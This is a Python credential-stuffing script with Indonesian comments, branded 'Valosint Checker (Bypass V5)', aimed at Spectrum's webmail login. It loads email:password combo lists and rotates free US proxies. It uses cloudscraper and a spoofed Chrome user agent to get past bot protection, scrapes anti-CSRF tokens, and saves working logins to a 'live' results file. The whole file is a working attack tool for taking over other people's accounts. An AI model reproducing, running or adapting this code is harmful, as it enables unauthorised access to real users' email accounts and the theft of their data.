import cloudscraper
import random
import time
import os
import sys
import requests
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)

class ValosintChecker:
    def __init__(self):
        self.valid_count = 0
        self.bad_count = 0
        self.error_count = 0
        self.lock = threading.Lock() # Mencegah tabrakan saat menghitung total
        self.logo = f"""
{Fore.CYAN}    ____   ____  _     _       ____   ____  _  _  _____ 
{Fore.CYAN}   |    \ |    || |   | |     |    | |    || || ||_   _|
{Fore.CYAN}   |  |  ||  |  || |   | |     |  |  ||  |  || || |  | |  
{Fore.CYAN}   |  |  ||  |  || |___| |___  |  |  ||  |  || || |  | |  
{Fore.CYAN}   |____/ |____||_____|_____| |____/ |____||_||_|  |_|  
{Fore.YELLOW}   =====================================================
{Fore.WHITE}   [+] NAME    : VALOSINT CHECKER ID (BYPASS V5)
{Fore.WHITE}   [+] STATUS  : {Fore.GREEN}SATELLITE CONNECTED / ANTI-FALSE POSITIVE
{Fore.YELLOW}   =====================================================
        """

    def _get_time(self):
        return datetime.now().strftime("%H:%M:%S")

    def _get_us_proxies(self):
        """Mengambil Proxy khusus negara US secara gratis dari API"""
        print(f"{Fore.YELLOW}[*] Mengambil proxy gratis (Region: USA)...")
        try:
            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=US&ssl=all&anonymity=all"
            res = requests.get(url, timeout=10)
            proxies = [line.strip() for line in res.text.splitlines() if line.strip()]
            print(f"{Fore.GREEN}[+] Berhasil mendapatkan {len(proxies)} proxy USA.")
            return proxies
        except Exception as e:
            print(f"{Fore.RED}[!] Gagal mengambil proxy gratis: {e}")
            return []

    def check_account(self, credential, proxies):
        if ":" not in credential: return
        email, password = credential.split(":")
        
        px = random.choice(proxies) if proxies else None
        px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
        
        try:
            target_url = "https://webmail.spectrum.net/index.php/mail/auth"
            
            # Bikin Session baru yang nyamar jadi Chrome Windows 10
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'Referer': target_url
            }

            # 1. Buka halaman depan dulu buat ambil SEMUA input tersembunyi (Anti-CSRF)
            res_get = scraper.get(target_url, headers=headers, proxies=px_map, timeout=15)
            soup = BeautifulSoup(res_get.text, 'html.parser')
            
            payload = {}
            for hidden in soup.find_all('input', type='hidden'):
                if hidden.get('name'):
                    payload[hidden.get('name')] = hidden.get('value', '')

            # 2. Tambahkan kredensial ke payload
            payload['email'] = email
            payload['password'] = password

            # 3. Kirim data Login
            res = scraper.post(target_url, data=payload, headers=headers, proxies=px_map, timeout=15, allow_redirects=True)

            ts = self._get_time()
            content = res.text.lower()
            
            # 4. Validasi SUPER KETAT berdasarkan pesan web aslinya
            
            # Cek jika Password Salah / Akun Mati (DD)
            if "doesn't match our records" in content or "invalid" in content or "incorrect" in content or "auth_failed" in content:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Wrong Password/Not Match")
                with self.lock:
                    self.bad_count += 1
            
            # Cek jika Login Sukses (LIVE) - URL harus pindah dari /auth
            elif "/auth" not in res.url and ("inbox" in res.url or "mail" in res.url or "signout" in content or "logout" in content):
                print(f"{Fore.GREEN}[{ts}] [LIVE] {email} | {password}")
                if not os.path.exists("results"): os.makedirs("results")
                with open("results/live.txt", "a") as f: f.write(f"{email}:{password}\n")
                with self.lock:
                    self.valid_count += 1
            
            # Cek jika akun dikunci sementara
            elif "locked" in content or "suspended" in content:
                print(f"{Fore.RED}[{ts}] [DD]   {email} | Account Locked")
                with self.lock:
                    self.bad_count += 1
            
            # Jika tidak sukses tapi juga tidak ada tulisan salah pass, berarti dicegat sistem bot
            else:
                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Terdeteksi Bot / Captcha")
                with self.lock:
                    self.error_count += 1

        except Exception as e:
            # Mengabaikan error koneksi agar terminal tetap bersih
            # print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Koneksi Timeout/Proxy Mati")
            with self.lock:
                self.error_count += 1

    def start(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(self.logo)

        # Input dengan default fallback
        combo_file = input(f"{Fore.WHITE}Masukkan File Combo [{Fore.CYAN}Tekan Enter untuk 'combo.txt'{Fore.WHITE}]: ").strip()
        if not combo_file: combo_file = "combo.txt"

        proxy_file = input(f"{Fore.WHITE}Masukkan File Proxy [{Fore.CYAN}Kosongkan u/ Auto Proxy USA{Fore.WHITE}]: ").strip()
        thread_input = input(f"{Fore.WHITE}Jumlah Thread       [{Fore.CYAN}Default: 5{Fore.WHITE}]                : ").strip()
        
        if not os.path.exists(combo_file):
            print(f"\n{Fore.RED}[!] File Combo '{combo_file}' tidak ditemukan di folder!")
            return

        threads = int(thread_input) if thread_input.isdigit() else 5
        accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
        
        # Penanganan Proxy
        proxies = []
        if proxy_file and os.path.exists(proxy_file):
            proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
            print(f"{Fore.GREEN}[+] Memuat {len(proxies)} proxy dari file {proxy_file}")
        else:
            proxies = self._get_us_proxies()

        if not accounts:
            print(f"{Fore.RED}[!] File combo kosong!")
            return

        print(f"\n{Fore.YELLOW}[*] Memulai Pengecekan {len(accounts)} Akun dengan {threads} Threads...\n")
        time.sleep(2)

        # Memulai Checker dengan ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for acc in accounts:
                executor.submit(self.check_account, acc, proxies)

        # Tampilan Rangkuman Hasil Akhir
        print(f"\n{Fore.CYAN}=====================================================")
        print(f"{Fore.GREEN}[+] TOTAL LIVE : {self.valid_count}")
        print(f"{Fore.RED}[-] TOTAL DD   : {self.bad_count}")
        print(f"{Fore.MAGENTA}[!] RETRY/ERR  : {self.error_count}")
        print(f"{Fore.CYAN}=====================================================")
        print(f"{Fore.WHITE}Selesai! Hasil LIVE disimpan di dalam folder 'results/'")

if __name__ == "__main__":
    ValosintChecker().start()
